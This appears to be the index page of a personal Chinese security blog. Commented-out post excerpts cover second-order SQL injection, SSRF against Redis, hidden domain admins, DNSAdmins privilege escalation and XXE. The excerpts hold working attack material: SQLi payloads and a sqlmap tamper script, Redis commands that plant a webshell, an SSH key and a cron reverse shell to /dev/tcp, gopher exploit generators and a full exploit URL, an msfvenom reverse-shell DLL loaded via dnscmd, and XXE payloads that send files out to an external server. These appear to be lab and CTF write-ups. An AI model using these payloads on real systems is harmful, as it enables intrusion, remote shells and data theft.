<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Twe1ve&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
  <meta property="og:type" content="website">
<meta property="og:title" content="Twe1ve&#39;s Blog">
<meta property="og:url" content="https://github.com/index.html">
<meta property="og:site_name" content="Twe1ve&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="icon" href="/images/icon.png">
  
  
<link rel="stylesheet" href="/css/index.css">



  <!-- 百度站長統計-->
  
  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
</head>

<div class="main height-100 flex flex-v">
  <div class="phone-header">
    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
  </div>
  <div class="main-top flex flex1">
    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
    <!--主页上左部分-->
    <div class="height-100 main-left  flex flex-v">
      <div class="main-left-top flex1">
        <a class="logo">
          <img src="/images/logo.svg" />
          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
        </a>
        <nav class="nav">

  
    
      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
        <div class="icon"><i class="iconfont icon-home"></i></div>
        <div class="name">
          <div class="cnname">首页</div>
          <div class="enname">Home Page</div>
        </div>
      </a>

    
      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
        <div class="icon"><i class="iconfont icon-archives"></i></div>
        <div class="name">
          <div class="cnname">归档</div>
          <div class="enname">Archive Page</div>
        </div>
      </a>

    
      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
        <div class="icon"><i class="iconfont icon-about"></i></div>
        <div class="name">
          <div class="cnname">关于我</div>
          <div class="enname">About Me</div>
        </div>
      </a>

    
  

  <!--<a href="/link/">
    <div class="icon"><i class="iconfont icon-link"></i></div>
    <div class="name">
      <div class="cnname">友情链接</div>
      <div class="enname">Friends Web Link</div>
    </div>
  </a>-->
</nav>

      </div>

      <view class="website-msg">
        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
        <!--
        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
        -->
        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
      </view>

      <div class="social flex flex-align-center ">
        
          
            
          
        
      </div>
    </div>
    <!--主页上右部分-->
    
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" class="title">二次注入详解</a>
    <section class="desc">
  0x01、二次注入原理：用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用
0x02、二次注入类型：
用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）
用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）

分析几个案例更容易理解；各个案例的源码我会在文末放出
0x03、案例1：直接以目标用户身份身份登录注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录
注册时构造payload：
用户名：admin&apos; -- -
密码：password登录处验证代码：
if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
// Check if username is empty
if(empty(trim($_POST[&quot;username&quot;]))){
    $username_err = &apos;Please enter username.&apos;;
} else{
    $username = trim($_POST[&quot;username&quot;]);
}

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}
####对用户输入没有进行特殊处理

if(empty(trim($_POST[&quot;username&quot;]))){
$username_err = &apos;Please enter username.&apos;;} else{
    $username = trim($_POST[&quot;username&quot;]);
  }

// Check if password is empty
if(empty(trim($_POST[&apos;password&apos;]))){
    $password_err = &apos;Please enter your password.&apos;;
} else{
    $password = trim($_POST[&apos;password&apos;]);
}

// Validate credentials
if(empty($username_err) &amp;&amp; empty($password_err)){
    // Prepare a select statement
    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;
####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  
##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - 
##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事   
    if($stmt = mysqli_prepare($link, $sql)){
        // Bind variables to the prepared statement as parameters
        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。
###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入
        // Set parameters
        $param_username = $username;

        // Attempt to execute the prepared statement
        if(mysqli_stmt_execute($stmt)){
            // Store result
            mysqli_stmt_store_result($stmt);     
###获取$sql执行结果              
            // Check if username exists, if yes then verify password
            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在               
                // Bind result variables
                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。
                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。
                    if(password_verify($password, $hashed_password)){
                        /* Password is correct, so start a new session and
                        save the username to the session */
                        session_start();
                        $_SESSION[&apos;username&apos;] = $username;      
                        header(&quot;location: home.php&quot;);
                    } else{
                        // Display an error message if password is not valid
                        $password_err = &apos;The password you entered was not valid.&apos;;
                    }
                }
            } else{
                // Display an error message if username doesn&apos;t exist
                $username_err = &apos;No account found with that username.&apos;;
            }
        } else{
            echo &quot;Oops! Something went wrong. Please try again later.&quot;;
        }
    }0x04、案例2：经典案例sqli-labs-24，更改管理账户密码在注册时构造payload
用户名： admin&apos; #
密码：password注册时对用户输入的注册用户名进行特殊字符转义
$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
$pass= mysql_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
....
###此时payload被转义为admin\&apos;\ #
...
$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());
...
##存入数据库后payload被还原为: admin&apos; #也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图

登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）
function sqllogin(){
   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);
   $row = mysql_fetch_row($res);
//print_r($row) ;
   if ($row[1]) {
return $row[1];
   } else {
  return 0;
   }
}简单验证一下注册和登录流程：

更改密码：
$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
####直接获取当前用户名进行密码更新
###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;
$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
........至此完成二次注入对目标用户密码的修改
0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入） 以HTB的NightMare靶机为例：
注册帐户名 ： ’
登录进入发现SQL报错

初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换
&apos; -- -  仍然报错；寻找正确闭合方式
&quot; -- - 回显SQL报错信息
&apos;) -- -无SQL报错信息
1&apos;) or 1=1 #无SQL报错信息
&apos;) order by 1000#   回显SQL报错信息
&apos;) order by 1#  无SQL报错信息
.....
###最终验证出列值为 2 使用SQLMAP进行POST二次注入；编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 
https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
注册：register username位置填入 payload ;密码固定password=123456    
post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }
然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  http://10.10.10.66/notes.php在index之后请求notes.php验证结果
response = s.post(“http://10.10.10.66/register.php&quot;, data=post_data)
php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)
最终tamper：
#!/usr/bin/env python
import reimport requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def create_account(payload):
s = requests.Session()

post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }
proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }
response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)
php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)

return &quot;PHPSESSID={0}&quot;.format(php_cookie)

def tamper(payload, **kwargs):
headers = kwargs.get(&quot;headers&quot;, {})
headers[&quot;Cookie&quot;] = create_account(payload)
return payloadsqlmap语句：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080

注意点：

post包中密码需要和tamper脚本中一致
去掉login.req中的cookie那一行
使用代理的话需要开启Burpsuit

这里就直接贴最终的paylaod吧：
sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast####需要–no-cast 参数
0x06、总结：主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的
参考链接：
http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/
http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5


</section>
    <p class="sub">May 19, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/19/SSRF-Redis/" class="title">SSRF+Redis</a>
    <section class="desc">
  猪猪侠SSRF议题
形成SSRF的代码示例：
&lt;?php
function curl($url){  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
}
$url = $_GET[&apos;url&apos;];
curl($url);
?&gt;SSRF绕过限制：
利用短网址

xip.io  –&gt; 127.0.0.1.xip.io

@符号绕过 –&gt; www.baidu.com@127.0.0.1 —&gt;访问127.0.0.1（利用解析问题绕过）

dns rebinding ： http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/

更改ip地址写法，如十六进制 http://127.0.0.1 —&gt;http://0177.0.0.1

协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）
 



Redis未授权绝对路径写webshell：
flushall
set 1 ‘‘ 
config set dir /var/www/html
config set dbfilename shell.php
save

写ssh公钥：
ssh-keygen -t rsa ###生成公钥
flushall
set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=
config set dir /root/.ssh/
config set dbfilename authorized_keys
save

写contrab定时任务反弹shell：

flushall
set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’
config set dir /var/spool/cron/
config set dbfilename root
save

SSRF+Redis利用
http、https 内网服务探测
file-读取文本
file:///etc/passwd
….
dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）

dict://127.0.0.1:6379/infodict://127.0.0.1:6379/getuserdict://127.0.0.1:6379/flushall
gopher 万能协议反弹shell：(redis利用需要REST编码)
Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码转换Redis RESP格式脚本https://xz.aliyun.com/t/5665#toc-4根据需求更改payload、filename、path的值
import urllib
protocol=&quot;gopher://&quot;
ip=&quot;127.0.0.1&quot;
port=&quot;6379&quot;
payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
filename=&quot;shell.php&quot;
path=&quot;/var/www/html&quot;
passwd=&quot;&quot;
cmd=[&quot;flushall&quot;,
 &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
 &quot;config set dir {}&quot;.format(path),
 &quot;config set dbfilename {}&quot;.format(filename),
 &quot;save&quot;
 ]
if passwd:
cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
def redis_format(arr):
CRLF=&quot;\r\n&quot;
redis_arr = arr.split(&quot; &quot;)
cmd=&quot;&quot;
cmd+=&quot;*&quot;+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
cmd+=CRLF
return cmd
if __name__==&quot;__main__&quot;:
for x in cmd:
payload += urllib.quote(redis_format(x))
print payloadubuntu无法写crontab反弹shell： https://xz.aliyun.com/t/1800

SSRF利用redis之不换行
FLUSHALL
config set dir /var/www/html/
set a1 ZY%16%0E%16F
set a2 ffffff
BITOP XOR payload a1 a2
append payload eval($_GET[c]);%3f&gt;
config set dbfilename cmd.php
save

Gopher有如下几点问题

PHP的curl默认不跟随302跳转
curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
file_get_contents()的SSRF，gopher协议不能使用URLencode
file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败

SSRF 打内网之POST请求(CTF题目)http://152.136.63.75:8016/index.php?url=    —&gt;存在SSRF
目录扫描发现 http://152.136.63.75:8016/webshe11231231231.php 页面
view-source:http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php   —&gt;file读取webshell源码
&lt;?php

$serverList = array(
&quot;127.0.0.1&quot;
);
$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
foreach ($serverList as $host) {
if ($ip === $host) {
if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
@eval($_POST[&apos;hacker&apos;]);
} else {
die(&quot;You aren&apos;t admin!&quot;);
}
} else {
die(&apos;This is webshell&apos;);
}
}GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：
exp = &apos;&apos;&apos;\
POST /webshe11231231231.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
&apos;&apos;&apos;
import urllib
tmp = urllib.quote(exp)
new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
result = &quot;_&quot;+urllib.quote(new)
print result更改命令的时候Content-Length的值也需要修改根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”

如上图所示，所以需要两次编码
生成paylaod：
kali@kali:~$ python exp.py
_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A最后exp：
152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A


</section>
    <p class="sub">May 19, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/" class="title">域渗透之隐藏管理员用户和派生本地管理员</a>
    <section class="desc">
  典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）
常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。
这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现
域隐藏管理账户：
A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。
由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A
Derivative Local Admins（派生本地管理员）：在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：
经典案例：（在这个例子中，Sally是WorkStation A中的派生本地管理员）

环境描述：

域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  

域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员

Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录

Sally在 “Workstation C”上登录


通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。
直接截取原文中的实际利用步骤：

则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）
那么我们简化一下上边的图，画出自己的理解图：

隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找
使用Bloodhound查找隐藏管理账户的几种方法：

Map Domain Trust
左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员
搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights



</section>
    <p class="sub">May 1, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/" class="title">域控提权之DNSadmins</a>
    <section class="desc">
  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
利用条件：
拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
whoami /groups  查看用户组

制作dll：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
sudo impacket-smbserver tw .注入dll
dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
nc -lvvp 444重启dns致使paylload生效：
sc.exe stop dns
sc.exe start dns或
sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 start dns  


</section>
    <p class="sub">Apr 30, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">XXE漏洞详解</a>
    <section class="desc">
  0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
1、XML：Extensible Markup Language，可扩展标记基础XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：

XML元素

属性

实体     


以一个简单的XXE POC为例：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明
&lt;!DOCTYPE test [                                ####文档类型定义（DTD）
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名
]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名2.DTD（文档类型定义）实体
定义XML文件中有哪些模块，这些模块能包含什么样的内容

DTD可以在XML文档内声明，也可以外部引用


内部声明DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
 &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
  &lt;!ELEMENT from    (#PCDATA)&gt;     
  &lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;
]&gt;
&lt;note&gt;
 &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;引用外部DTD：
DTD文件内容：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
&lt;!ELEMENT from    (#PCDATA)&gt;     
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;引用DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;
&lt;note&gt;
  &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询

3、为什么能形成注入？XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换简单的漏洞代码：
&lt;?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents(&apos;php://input&apos;);
$dom = new DOMDocument();

# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds-&gt;user;
$pass = $creds-&gt;pass;
#回显信息
  echo &quot;You have logged in as user $user&quot;;
###漏洞触发点在user元素中
?&gt;0x02、XXE漏洞验证：如上漏洞代码poc，paylaod.txt：
&lt;creds&gt;
&lt;user&gt; Ed &lt;/user&gt;
&lt;pass&gt; mypass &lt;/pass&gt;
&lt;/creds&gt;
tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）

&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;curl验证：
curl -d @payload.txt http://localhost/xml_injectable.php显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息

0x03、XXE能做什么：[1]文件读取
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
[2]SSRF探测端口内网服务
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
尝试在XXE漏洞代码中加入：    error_reporting(0);

上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）
[3]Bind XXE （OOB）外带数据（无回显攻击）
[代码中注释掉 echo “You have logged in as user $user”;]
OOB  文件读取
evil.dtd：
&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
